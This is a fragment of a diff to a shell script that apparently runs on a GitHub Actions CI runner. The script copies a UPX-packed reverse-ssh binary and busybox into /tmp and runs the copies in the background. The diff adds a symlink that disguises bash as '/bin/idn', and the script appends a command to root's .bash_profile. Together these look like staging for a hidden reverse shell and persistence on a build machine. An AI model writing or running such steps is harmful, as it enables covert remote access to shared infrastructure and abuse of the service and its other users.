@@ -12,11 +12,11 @@
 #setsid docker pull centos:centos7  &
 
 cd /tmp;
-cp /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin .;
-cp /home/runner/work/nc_test/nc_test/busybox.bin  .;
+cp /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin . &
+cp /home/runner/work/nc_test/nc_test/busybox.bin  . &
 
 
-sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
+sudo bash -c 'ln -s /bin/bash /bin/idn;echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 
 
 
